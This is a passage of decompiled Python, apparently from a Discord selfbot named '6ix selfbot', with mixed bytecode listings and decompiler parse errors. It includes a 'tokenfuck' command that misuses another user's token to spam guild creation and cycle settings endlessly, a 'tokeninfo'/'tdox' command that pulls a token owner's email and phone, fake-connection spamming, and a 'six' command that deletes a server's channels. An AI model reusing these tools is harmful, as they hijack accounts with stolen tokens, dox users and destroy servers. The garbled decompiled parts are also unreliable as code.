 L.1707        92  LOAD_FAST                'r'
               94  LOAD_METHOD              iter_content
               96  LOAD_CONST               1024
               98  CALL_METHOD_1         1  ''
              100  GET_ITER         
            102_0  COME_FROM           124  '124'
              102  FOR_ITER            126  'to 126'
              104  STORE_FAST               'block'

 L.1708       106  LOAD_FAST                'block'
              108  POP_JUMP_IF_TRUE    114  'to 114'

 L.1709       110  POP_TOP          
              112  BREAK_LOOP          126  'to 126'
            114_0  COME_FROM           108  '108'

 L.1710       114  LOAD_FAST                'f'
              116  LOAD_METHOD              write
              118  LOAD_FAST                'block'
              120  CALL_METHOD_1         1  ''
              122  POP_TOP          
              124  JUMP_BACK           102  'to 102'
            126_0  COME_FROM           112  '112'
            126_1  COME_FROM           102  '102'
              126  POP_BLOCK        
              128  BEGIN_FINALLY    
            130_0  COME_FROM_WITH       72  '72'
              130  WITH_CLEANUP_START
              132  WITH_CLEANUP_FINISH
              134  END_FINALLY      

 L.1711       136  SETUP_FINALLY       206  'to 206'

 L.1712       138  LOAD_GLOBAL              Image
              140  LOAD_METHOD              open
              142  LOAD_STR                 'Images/Avatars/Stolen/Stolen.png'
              144  CALL_METHOD_1         1  ''
              146  LOAD_METHOD              convert
              148  LOAD_STR                 'RGB'
              150  CALL_METHOD_1         1  ''
              152  POP_TOP          

 L.1713       154  LOAD_GLOBAL              open
              156  LOAD_STR                 'Images/Avatars/Stolen/Stolen.png'
              158  LOAD_STR                 'rb'
              160  CALL_FUNCTION_2       2  ''
              162  SETUP_WITH          196  'to 196'
              164  STORE_FAST               'f'

 L.1714       166  LOAD_GLOBAL              SIX
              168  LOAD_ATTR                user
              170  LOAD_ATTR                edit
              172  LOAD_FAST                'password'
              174  LOAD_FAST                'f'
              176  LOAD_METHOD              read
              178  CALL_METHOD_0         0  ''
              180  LOAD_CONST               ('password', 'avatar')
              182  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              184  GET_AWAITABLE    
              186  LOAD_CONST               None
              188  YIELD_FROM       
              190  POP_TOP          
              192  POP_BLOCK        
              194  BEGIN_FINALLY    
            196_0  COME_FROM_WITH      162  '162'
              196  WITH_CLEANUP_START
              198  WITH_CLEANUP_FINISH
              200  END_FINALLY      
              202  POP_BLOCK        
              204  JUMP_FORWARD        276  'to 276'
            206_0  COME_FROM_FINALLY   136  '136'

 L.1715       206  DUP_TOP          
              208  LOAD_GLOBAL              discord
              210  LOAD_ATTR                HTTPException
              212  COMPARE_OP               exception-match
          214_216  POP_JUMP_IF_FALSE   274  'to 274'
              218  POP_TOP          
              220  STORE_FAST               'e'
              222  POP_TOP          
              224  SETUP_FINALLY       262  'to 262'

 L.1716       226  LOAD_GLOBAL              print
              228  LOAD_GLOBAL              Fore
              230  LOAD_ATTR                RED
              232  FORMAT_VALUE          0  ''
              234  LOAD_STR                 'error: '
              236  LOAD_GLOBAL              Fore
              238  LOAD_ATTR                LIGHTYELLOW_EX
              240  FORMAT_VALUE          0  ''
              242  LOAD_FAST                'e'
              244  FORMAT_VALUE          0  ''
              246  BUILD_STRING_4        4 
              248  LOAD_GLOBAL              Fore
              250  LOAD_ATTR                RESET
              252  BINARY_ADD       
              254  CALL_FUNCTION_1       1  ''
              256  POP_TOP          
              258  POP_BLOCK        
              260  BEGIN_FINALLY    
            262_0  COME_FROM_FINALLY   224  '224'
              262  LOAD_CONST               None
              264  STORE_FAST               'e'
              266  DELETE_FAST              'e'
              268  END_FINALLY      
              270  POP_EXCEPT       
              272  JUMP_FORWARD        276  'to 276'
            274_0  COME_FROM           214  '214'
              274  END_FINALLY      
            276_0  COME_FROM           272  '272'
            276_1  COME_FROM           204  '204'
            276_2  COME_FROM            52  '52'

Parse error at or near `BEGIN_FINALLY' instruction at offset 128


@SIX.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp--- This code section failed: ---

 L.1720         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1721        16  LOAD_GLOBAL              config
               18  LOAD_METHOD              get
               20  LOAD_STR                 'password'
               22  CALL_METHOD_1         1  ''
               24  LOAD_STR                 'password-here'
               26  COMPARE_OP               ==
               28  POP_JUMP_IF_FALSE    54  'to 54'

 L.1722        30  LOAD_GLOBAL              print
               32  LOAD_GLOBAL              Fore
               34  LOAD_ATTR                RED
               36  FORMAT_VALUE          0  ''
               38  LOAD_STR                 '[ERROR] LIGHTYELLOW_EXYou didnt put your password in the config.json file'
               40  BUILD_STRING_2        2 
               42  LOAD_GLOBAL              Fore
               44  LOAD_ATTR                RESET
               46  BINARY_ADD       
               48  CALL_FUNCTION_1       1  ''
               50  POP_TOP          
               52  JUMP_FORWARD        134  'to 134'
             54_0  COME_FROM            28  '28'

 L.1724        54  LOAD_GLOBAL              config
               56  LOAD_METHOD              get
               58  LOAD_STR                 'password'
               60  CALL_METHOD_1         1  ''
               62  STORE_FAST               'password'

 L.1725        64  LOAD_GLOBAL              open
               66  LOAD_STR                 'Images/Avatars/PFP-1.png'
               68  LOAD_STR                 'wb'
               70  CALL_FUNCTION_2       2  ''
               72  SETUP_WITH          128  'to 128'
               74  STORE_FAST               'f'

 L.1726        76  LOAD_GLOBAL              requests
               78  LOAD_ATTR                get
               80  LOAD_FAST                'url'
               82  LOAD_CONST               True
               84  LOAD_CONST               ('stream',)
               86  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               88  STORE_FAST               'r'

 L.1727        90  LOAD_FAST                'r'
               92  LOAD_METHOD              iter_content
               94  LOAD_CONST               1024
               96  CALL_METHOD_1         1  ''
               98  GET_ITER         
            100_0  COME_FROM           122  '122'
              100  FOR_ITER            124  'to 124'
              102  STORE_FAST               'block'

 L.1728       104  LOAD_FAST                'block'
              106  POP_JUMP_IF_TRUE    112  'to 112'

 L.1729       108  POP_TOP          
              110  BREAK_LOOP          124  'to 124'
            112_0  COME_FROM           106  '106'

 L.1730       112  LOAD_FAST                'f'
              114  LOAD_METHOD              write
              116  LOAD_FAST                'block'
              118  CALL_METHOD_1         1  ''
              120  POP_TOP          
              122  JUMP_BACK           100  'to 100'
            124_0  COME_FROM           110  '110'
            124_1  COME_FROM           100  '100'
              124  POP_BLOCK        
              126  BEGIN_FINALLY    
            128_0  COME_FROM_WITH       72  '72'
              128  WITH_CLEANUP_START
              130  WITH_CLEANUP_FINISH
              132  END_FINALLY      
            134_0  COME_FROM            52  '52'

 L.1731       134  SETUP_FINALLY       204  'to 204'

 L.1732       136  LOAD_GLOBAL              Image
              138  LOAD_METHOD              open
              140  LOAD_STR                 'Images/Avatars/PFP-1.png'
              142  CALL_METHOD_1         1  ''
              144  LOAD_METHOD              convert
              146  LOAD_STR                 'RGB'
              148  CALL_METHOD_1         1  ''
              150  POP_TOP          

 L.1733       152  LOAD_GLOBAL              open
              154  LOAD_STR                 'Images/Avatars/PFP-1.png'
              156  LOAD_STR                 'rb'
              158  CALL_FUNCTION_2       2  ''
              160  SETUP_WITH          194  'to 194'
              162  STORE_FAST               'f'

 L.1734       164  LOAD_GLOBAL              SIX
              166  LOAD_ATTR                user
              168  LOAD_ATTR                edit
              170  LOAD_FAST                'password'
              172  LOAD_FAST                'f'
              174  LOAD_METHOD              read
              176  CALL_METHOD_0         0  ''
              178  LOAD_CONST               ('password', 'avatar')
              180  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              182  GET_AWAITABLE    
              184  LOAD_CONST               None
              186  YIELD_FROM       
              188  POP_TOP          
              190  POP_BLOCK        
              192  BEGIN_FINALLY    
            194_0  COME_FROM_WITH      160  '160'
              194  WITH_CLEANUP_START
              196  WITH_CLEANUP_FINISH
              198  END_FINALLY      
              200  POP_BLOCK        
              202  JUMP_FORWARD        274  'to 274'
            204_0  COME_FROM_FINALLY   134  '134'

 L.1735       204  DUP_TOP          
              206  LOAD_GLOBAL              discord
              208  LOAD_ATTR                HTTPException
              210  COMPARE_OP               exception-match
          212_214  POP_JUMP_IF_FALSE   272  'to 272'
              216  POP_TOP          
              218  STORE_FAST               'e'
              220  POP_TOP          
              222  SETUP_FINALLY       260  'to 260'

 L.1736       224  LOAD_GLOBAL              print
              226  LOAD_GLOBAL              Fore
              228  LOAD_ATTR                RED
              230  FORMAT_VALUE          0  ''
              232  LOAD_STR                 'error: '
              234  LOAD_GLOBAL              Fore
              236  LOAD_ATTR                LIGHTYELLOW_EX
              238  FORMAT_VALUE          0  ''
              240  LOAD_FAST                'e'
              242  FORMAT_VALUE          0  ''
              244  BUILD_STRING_4        4 
              246  LOAD_GLOBAL              Fore
              248  LOAD_ATTR                RESET
              250  BINARY_ADD       
              252  CALL_FUNCTION_1       1  ''
              254  POP_TOP          
              256  POP_BLOCK        
              258  BEGIN_FINALLY    
            260_0  COME_FROM_FINALLY   222  '222'
              260  LOAD_CONST               None
              262  STORE_FAST               'e'
              264  DELETE_FAST              'e'
              266  END_FINALLY      
              268  POP_EXCEPT       
              270  JUMP_FORWARD        274  'to 274'
            272_0  COME_FROM           212  '212'
              272  END_FINALLY      
            274_0  COME_FROM           270  '270'
            274_1  COME_FROM           202  '202'

Parse error at or near `BEGIN_FINALLY' instruction at offset 126


@SIX.command(aliases=['dong', 'penis', 'pp'])
async def dick(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ''
    for _i in range(0, size):
        dong += '='
    else:
        em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", color=(discord.Color(random.randint(0, 16777215))))
        await ctx.send(embed=em)


@SIX.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {'Authorization':token, 
     'Content-Type':'application/json', 
     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    if house == 'bravery':
        payload = {'house_id': 1}
    elif house == 'brilliance':
        payload = {'house_id': 2}
    elif house == 'balance':
        payload = {'house_id': 3}
    elif house == 'random':
        houses = [
         1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        try:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
        finally:
            e = None
            del e


@SIX.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck--- This code section failed: ---

 L.1775         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1777        16  LOAD_STR                 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7'

 L.1778        18  LOAD_STR                 'application/json'

 L.1779        20  LOAD_FAST                '_token'

 L.1776        22  LOAD_CONST               ('User-Agent', 'Content-Type', 'Authorization')
               24  BUILD_CONST_KEY_MAP_3     3 
               26  STORE_FAST               'headers'

 L.1781        28  LOAD_GLOBAL              requests
               30  LOAD_METHOD              Session
               32  CALL_METHOD_0         0  ''
               34  STORE_FAST               'request'

 L.1783        36  LOAD_STR                 'light'

 L.1784        38  LOAD_STR                 'ja'

 L.1785        40  LOAD_CONST               False

 L.1786        42  LOAD_CONST               False

 L.1787        44  LOAD_CONST               False

 L.1788        46  LOAD_CONST               False

 L.1789        48  LOAD_CONST               False

 L.1790        50  LOAD_CONST               False

 L.1791        52  LOAD_CONST               False

 L.1792        54  LOAD_CONST               False

 L.1793        56  LOAD_CONST               False

 L.1794        58  LOAD_STR                 '0'

 L.1795        60  LOAD_STR                 'invisible'

 L.1782        62  LOAD_CONST               ('theme', 'locale', 'message_display_compact', 'inline_embed_media', 'inline_attachment_media', 'gif_auto_play', 'render_embeds', 'render_reactions', 'animate_emoji', 'convert_emoticons', 'enable_tts_command', 'explicit_content_filter', 'status')
               64  BUILD_CONST_KEY_MAP_13    13 
               66  STORE_FAST               'payload'

 L.1798        68  LOAD_STR                 'daddy 6ix'

 L.1799        70  LOAD_STR                 'https://cdn.discordapp.com/attachments/699828368840982578/702719106406809610/giphy.gif'

 L.1800        72  LOAD_STR                 '6ix NUKED U'

 L.1801        74  LOAD_STR                 'europe'

 L.1797        76  LOAD_CONST               ('channels', 'icon', 'name', 'region')
               78  BUILD_CONST_KEY_MAP_4     4 
               80  STORE_FAST               'guild'

 L.1803        82  LOAD_GLOBAL              range
               84  LOAD_CONST               50
               86  CALL_FUNCTION_1       1  ''
               88  GET_ITER         
             90_0  COME_FROM           110  '110'
               90  FOR_ITER            112  'to 112'
               92  STORE_FAST               '_i'

 L.1804        94  LOAD_GLOBAL              requests
               96  LOAD_ATTR                post
               98  LOAD_STR                 'https://discordapp.com/api/v6/guilds'
              100  LOAD_FAST                'headers'
              102  LOAD_FAST                'guild'
              104  LOAD_CONST               ('headers', 'json')
              106  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              108  POP_TOP          
              110  JUMP_BACK            90  'to 90'
            112_0  COME_FROM           202  '202'
            112_1  COME_FROM           196  '196'
            112_2  COME_FROM            90  '90'

 L.1806       112  SETUP_FINALLY       134  'to 134'

 L.1807       114  LOAD_FAST                'request'
              116  LOAD_ATTR                patch
              118  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/settings'
              120  LOAD_FAST                'headers'
              122  LOAD_FAST                'payload'
              124  LOAD_CONST               ('headers', 'json')
              126  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              128  POP_TOP          
              130  POP_BLOCK        
              132  JUMP_FORWARD        204  'to 204'
            134_0  COME_FROM_FINALLY   112  '112'

 L.1808       134  DUP_TOP          
              136  LOAD_GLOBAL              Exception
              138  COMPARE_OP               exception-match
              140  POP_JUMP_IF_FALSE   198  'to 198'
              142  POP_TOP          
              144  STORE_FAST               'e'
              146  POP_TOP          
              148  SETUP_FINALLY       186  'to 186'

 L.1809       150  LOAD_GLOBAL              print
              152  LOAD_GLOBAL              Fore
              154  LOAD_ATTR                RED
              156  FORMAT_VALUE          0  ''
              158  LOAD_STR                 'error: '
              160  LOAD_GLOBAL              Fore
              162  LOAD_ATTR                LIGHTYELLOW_EX
              164  FORMAT_VALUE          0  ''
              166  LOAD_FAST                'e'
              168  FORMAT_VALUE          0  ''
              170  BUILD_STRING_4        4 
              172  LOAD_GLOBAL              Fore
              174  LOAD_ATTR                RESET
              176  BINARY_ADD       
              178  CALL_FUNCTION_1       1  ''
              180  POP_TOP          
              182  POP_BLOCK        
              184  BEGIN_FINALLY    
            186_0  COME_FROM_FINALLY   148  '148'
              186  LOAD_CONST               None
              188  STORE_FAST               'e'
              190  DELETE_FAST              'e'
              192  END_FINALLY      
              194  POP_EXCEPT       
              196  JUMP_BACK           112  'to 112'
            198_0  COME_FROM           140  '140'
              198  END_FINALLY      

 L.1811       200  JUMP_FORWARD        204  'to 204'
              202  JUMP_BACK           112  'to 112'
            204_0  COME_FROM           200  '200'
            204_1  COME_FROM           132  '132'

 L.1812       204  LOAD_GLOBAL              cycle
              206  LOAD_STR                 'light'
              208  LOAD_STR                 'dark'
              210  BUILD_LIST_2          2 
              212  CALL_FUNCTION_1       1  ''
              214  STORE_FAST               'modes'

 L.1813       216  LOAD_GLOBAL              cycle
              218  LOAD_STR                 'online'
              220  LOAD_STR                 'idle'
              222  LOAD_STR                 'dnd'
              224  LOAD_STR                 'invisible'
              226  BUILD_LIST_4          4 
              228  CALL_FUNCTION_1       1  ''
              230  STORE_FAST               'statuses'
            232_0  COME_FROM           346  '346'
            232_1  COME_FROM           342  '342'

 L.1816       232  LOAD_GLOBAL              next
              234  LOAD_FAST                'modes'
              236  CALL_FUNCTION_1       1  ''

 L.1817       238  LOAD_GLOBAL              next
              240  LOAD_FAST                'statuses'
              242  CALL_FUNCTION_1       1  ''

 L.1815       244  LOAD_CONST               ('theme', 'status')
              246  BUILD_CONST_KEY_MAP_2     2 
              248  STORE_FAST               'setting'
            250_0  COME_FROM           344  '344'
            250_1  COME_FROM           338  '338'

 L.1820       250  SETUP_FINALLY       274  'to 274'

 L.1821       252  LOAD_FAST                'request'
              254  LOAD_ATTR                patch
              256  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/settings'
              258  LOAD_FAST                'headers'
              260  LOAD_FAST                'setting'
              262  LOAD_CONST               10
              264  LOAD_CONST               ('headers', 'json', 'timeout')
              266  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
              268  POP_TOP          
              270  POP_BLOCK        
              272  JUMP_FORWARD        342  'to 342'
            274_0  COME_FROM_FINALLY   250  '250'

 L.1822       274  DUP_TOP          
              276  LOAD_GLOBAL              Exception
              278  COMPARE_OP               exception-match
          280_282  POP_JUMP_IF_FALSE   340  'to 340'
              284  POP_TOP          
              286  STORE_FAST               'e'
              288  POP_TOP          
              290  SETUP_FINALLY       328  'to 328'

 L.1823       292  LOAD_GLOBAL              print
              294  LOAD_GLOBAL              Fore
              296  LOAD_ATTR                RED
              298  FORMAT_VALUE          0  ''
              300  LOAD_STR                 'error: '
              302  LOAD_GLOBAL              Fore
              304  LOAD_ATTR                LIGHTYELLOW_EX
              306  FORMAT_VALUE          0  ''
              308  LOAD_FAST                'e'
              310  FORMAT_VALUE          0  ''
              312  BUILD_STRING_4        4 
              314  LOAD_GLOBAL              Fore
              316  LOAD_ATTR                RESET
              318  BINARY_ADD       
              320  CALL_FUNCTION_1       1  ''
              322  POP_TOP          
              324  POP_BLOCK        
              326  BEGIN_FINALLY    
            328_0  COME_FROM_FINALLY   290  '290'
              328  LOAD_CONST               None
              330  STORE_FAST               'e'
              332  DELETE_FAST              'e'
              334  END_FINALLY      
              336  POP_EXCEPT       
              338  JUMP_BACK           250  'to 250'
            340_0  COME_FROM           280  '280'
              340  END_FINALLY      
            342_0  COME_FROM           272  '272'

 L.1825       342  CONTINUE            232  'to 232'
              344  JUMP_BACK           250  'to 250'
              346  JUMP_BACK           232  'to 232'

Parse error at or near `JUMP_FORWARD' instruction at offset 200


@SIX.command()
async def masslogin(ctx, choice=None):
    await ctx.message.delete()
    _masslogin(choice)


@SIX.command()
async def masscon--- This code section failed: ---

 L.1834         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1836        16  LOAD_FAST                'name'

 L.1837        18  LOAD_CONST               1

 L.1835        20  LOAD_CONST               ('name', 'visibility')
               22  BUILD_CONST_KEY_MAP_2     2 
               24  STORE_FAST               'payload'

 L.1840        26  LOAD_GLOBAL              token

 L.1841        28  LOAD_STR                 'application/json'

 L.1839        30  LOAD_CONST               ('Authorization', 'Content-Type')
               32  BUILD_CONST_KEY_MAP_2     2 
               34  STORE_FAST               'headers'

 L.1844        36  LOAD_STR                 'battlenet'

 L.1845        38  LOAD_STR                 'skype'

 L.1846        40  LOAD_STR                 'leagueoflegends'

 L.1843        42  BUILD_LIST_3          3 
               44  STORE_FAST               'avaliable'

 L.1848        46  LOAD_FAST                'name'
               48  LOAD_CONST               None
               50  COMPARE_OP               is
               52  POP_JUMP_IF_FALSE    60  'to 60'

 L.1849        54  LOAD_STR                 'about:blank'
               56  STORE_FAST               'name'
               58  JUMP_FORWARD         82  'to 82'
             60_0  COME_FROM            52  '52'

 L.1850        60  LOAD_FAST                '_type'
               62  LOAD_FAST                'avaliable'
               64  COMPARE_OP               not-in
               66  POP_JUMP_IF_FALSE    82  'to 82'

 L.1851        68  LOAD_GLOBAL              print
               70  LOAD_STR                 'Avaliable connections: '
               72  LOAD_FAST                'avaliable'
               74  FORMAT_VALUE          0  ''
               76  BUILD_STRING_2        2 
               78  CALL_FUNCTION_1       1  ''
               80  POP_TOP          
             82_0  COME_FROM            66  '66'
             82_1  COME_FROM            58  '58'

 L.1852        82  LOAD_GLOBAL              range
               84  LOAD_FAST                'amount'
               86  CALL_FUNCTION_1       1  ''
               88  GET_ITER         
             90_0  COME_FROM           288  '288'
             90_1  COME_FROM           284  '284'
             90_2  COME_FROM           226  '226'
               90  FOR_ITER            290  'to 290'
               92  STORE_FAST               '_i'

 L.1853        94  SETUP_FINALLY       228  'to 228'

 L.1854        96  LOAD_GLOBAL              random
               98  LOAD_METHOD              randint
              100  LOAD_CONST               10000000
              102  LOAD_CONST               90000000
              104  CALL_METHOD_2         2  ''
              106  STORE_FAST               'ID'

 L.1855       108  LOAD_GLOBAL              time
              110  LOAD_METHOD              sleep
              112  LOAD_CONST               5
              114  CALL_METHOD_1         1  ''
              116  POP_TOP          

 L.1856       118  LOAD_GLOBAL              requests
              120  LOAD_ATTR                put
              122  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/connections/'
              124  LOAD_FAST                '_type'
              126  FORMAT_VALUE          0  ''
              128  LOAD_STR                 '/'
              130  LOAD_FAST                'ID'
              132  FORMAT_VALUE          0  ''
              134  BUILD_STRING_4        4 
              136  LOAD_GLOBAL              json
              138  LOAD_METHOD              dumps
              140  LOAD_FAST                'payload'
              142  CALL_METHOD_1         1  ''
              144  LOAD_FAST                'headers'
              146  LOAD_CONST               ('data', 'headers')
              148  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              150  STORE_FAST               'r'

 L.1857       152  LOAD_FAST                'r'
              154  LOAD_ATTR                status_code
              156  LOAD_CONST               200
              158  COMPARE_OP               ==
              160  POP_JUMP_IF_FALSE   190  'to 190'

 L.1858       162  LOAD_GLOBAL              print
              164  LOAD_STR                 '['
              166  LOAD_GLOBAL              Fore
              168  LOAD_ATTR                GREEN
              170  FORMAT_VALUE          0  ''
              172  LOAD_STR                 '+'
              174  LOAD_GLOBAL              Fore
              176  LOAD_ATTR                RESET
              178  FORMAT_VALUE          0  ''
              180  LOAD_STR                 '] New connection added!'
              182  BUILD_STRING_5        5 
              184  CALL_FUNCTION_1       1  ''
              186  POP_TOP          
              188  JUMP_FORWARD        224  'to 224'
            190_0  COME_FROM           160  '160'

 L.1860       190  LOAD_GLOBAL              print
              192  LOAD_STR                 '['
              194  LOAD_GLOBAL              Fore
              196  LOAD_ATTR                RED
              198  FORMAT_VALUE          0  ''
              200  LOAD_STR                 '-'
              202  LOAD_GLOBAL              Fore
              204  LOAD_ATTR                RESET
              206  FORMAT_VALUE          0  ''
              208  LOAD_STR                 '] Couldnt add connection!'
              210  BUILD_STRING_5        5 
              212  CALL_FUNCTION_1       1  ''
              214  POP_TOP          

 L.1860       216  POP_BLOCK        
              218  POP_TOP          
          220_222  JUMP_FORWARD        290  'to 290'
            224_0  COME_FROM           188  '188'
              224  POP_BLOCK        
              226  JUMP_BACK            90  'to 90'
            228_0  COME_FROM_FINALLY    94  '94'

 L.1861       228  DUP_TOP          
              230  LOAD_GLOBAL              Exception
              232  LOAD_GLOBAL              ValueError
              234  BUILD_TUPLE_2         2 
              236  COMPARE_OP               exception-match
          238_240  POP_JUMP_IF_FALSE   286  'to 286'
              242  POP_TOP          
              244  STORE_FAST               'e'
              246  POP_TOP          
              248  SETUP_FINALLY       274  'to 274'

 L.1862       250  LOAD_GLOBAL              print
              252  LOAD_FAST                'e'
              254  CALL_FUNCTION_1       1  ''
              256  POP_TOP          

 L.1862       258  POP_BLOCK        
              260  POP_EXCEPT       
              262  CALL_FINALLY        274  'to 274'
              264  POP_TOP          
          266_268  JUMP_FORWARD        290  'to 290'
              270  POP_BLOCK        
              272  BEGIN_FINALLY    
            274_0  COME_FROM           262  '262'
            274_1  COME_FROM_FINALLY   248  '248'
              274  LOAD_CONST               None
              276  STORE_FAST               'e'
              278  DELETE_FAST              'e'
              280  END_FINALLY      
              282  POP_EXCEPT       
              284  JUMP_BACK            90  'to 90'
            286_0  COME_FROM           238  '238'
              286  END_FINALLY      
              288  JUMP_BACK            90  'to 90'
            290_0  COME_FROM           266  '266'
            290_1  COME_FROM           220  '220'
            290_2  COME_FROM            90  '90'

 L.1863       290  LOAD_GLOBAL              print
              292  LOAD_STR                 '['
              294  LOAD_GLOBAL              Fore
              296  LOAD_ATTR                GREEN
              298  FORMAT_VALUE          0  ''
              300  LOAD_STR                 '+'
              302  LOAD_GLOBAL              Fore
              304  LOAD_ATTR                RESET
              306  FORMAT_VALUE          0  ''
              308  LOAD_STR                 '] Finished adding connections!'
              310  BUILD_STRING_5        5 
              312  CALL_FUNCTION_1       1  ''
              314  POP_TOP          

Parse error at or near `CALL_FINALLY' instruction at offset 262


@SIX.command(aliases=['fakeconnection', 'spoofconnection'])
async def fakenet(ctx, _type, *, name=None):
    await ctx.message.delete()
    ID = random.randrange(10000000, 90000000)
    avaliable = [
     'battlenet',
     'skype',
     'leagueoflegends']
    payload = {'name':name, 
     'visibility':1}
    headers = {'Authorization':token, 
     'Content-Type':'application/json'}
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f"Avaliable connections: `{avaliable}`", delete_after=3)
    r = requests.put(f"https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}", data=(json.dumps(payload)), headers=headers)
    if r.status_code == 200:
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after=3)


@SIX.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {'Authorization':_token, 
     'Content-Type':'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Invalid token" + Fore.RESET)
    else:
        em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})",
          color=(discord.Color(random.randint(0, 16777215))))
        fields = [
         {'name':'Phone', 
          'value':res['phone']},
         {'name':'Flags', 
          'value':res['flags']},
         {'name':'MFA?', 
          'value':res['mfa_enabled']},
         {'name':'Verified?', 
          'value':res['verified']}]
        for field in fields:
            if field['value']:
                em.add_field(name=(field['name']), value=(field['value']), inline=False)
                em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
        else:
            return await ctx.send(embed=em)


@SIX.command()
async def copy(ctx):
    await ctx.message.delete()
    await SIX.create_guild(f"backup-{ctx.guild.name}")
    await asyncio.sleep(4)
    for g in SIX.guilds:
        if f"backup-{ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()

    else:
        for cate in ctx.guild.categories:
            x = await g.create_category(f"{cate.name}")
            for chann in cate.channels:
                if isinstance(chann, discord.VoiceChannel):
                    await x.create_voice_channel(f"{chann}")
                elif isinstance(chann, discord.TextChannel):
                    await x.create_text_channel(f"{chann}")
                if isinstance(chann, discord.Role):
                    await x.create_role(f"{chann}")

    try:
        await g.edit(icon=(ctx.guild.icon_url))
    except:
        pass


@SIX.command()
async def six--- This code section failed: ---

 L.1948         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1949        16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Embed
               20  LOAD_STR                 'fucking the server'
               22  LOAD_STR                 ''
               24  LOAD_CONST               0
               26  LOAD_CONST               ('title', 'description', 'color')
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  STORE_FAST               'em'

 L.1950        32  LOAD_FAST                'em'
               34  LOAD_ATTR                set_image
               36  LOAD_STR                 'https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128'
               38  LOAD_CONST               ('url',)
               40  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               42  POP_TOP          

 L.1951        44  LOAD_FAST                'em'
               46  LOAD_ATTR                set_footer
               48  LOAD_STR                 '6ix selfbot'
               50  LOAD_FAST                'ctx'
               52  LOAD_ATTR                author
               54  LOAD_ATTR                avatar_url
               56  LOAD_CONST               ('text', 'icon_url')
               58  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               60  POP_TOP          

 L.1952        62  LOAD_FAST                'ctx'
               64  LOAD_ATTR                send
               66  LOAD_FAST                'em'
               68  LOAD_CONST               ('embed',)
               70  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          

 L.1953        80  LOAD_GLOBAL              list
               82  LOAD_FAST                'ctx'
               84  LOAD_ATTR                guild
               86  LOAD_ATTR                channels
               88  CALL_FUNCTION_1       1  ''
               90  GET_ITER         
             92_0  COME_FROM           128  '128'
             92_1  COME_FROM           124  '124'
             92_2  COME_FROM           114  '114'
               92  FOR_ITER            130  'to 130'
               94  STORE_FAST               'channel'

 L.1954        96  SETUP_FINALLY       116  'to 116'

 L.1955        98  LOAD_FAST                'channel'
              100  LOAD_METHOD              delete
              102  CALL_METHOD_0         0  ''
